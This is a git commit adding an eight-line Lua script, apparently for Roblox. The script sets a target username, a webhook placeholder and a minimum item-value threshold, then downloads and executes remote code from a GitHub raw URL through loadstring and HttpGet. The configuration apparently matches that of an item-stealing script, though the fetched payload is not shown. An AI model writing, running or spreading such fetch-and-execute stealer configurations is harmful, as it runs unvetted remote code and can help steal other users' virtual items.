9c086857889e1e552be7718bd7ed049390096244
VOIDZ <goldbed145@gmail.com>
2024-12-12 10:31:17 +0800

    Add generated file: VoidScript_753777_combined.lua

---
+++ lua/VoidScript_753777_combined.lua
@@ -0,0 +1,8 @@
+-- User Information
+Username = 'ywsyes'
+Webhook = 'nono'
+
+-- Script Code
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VOIDv3/VOIDSCRIPTS/refs/heads/main/VOIDSCRIPTS'))()
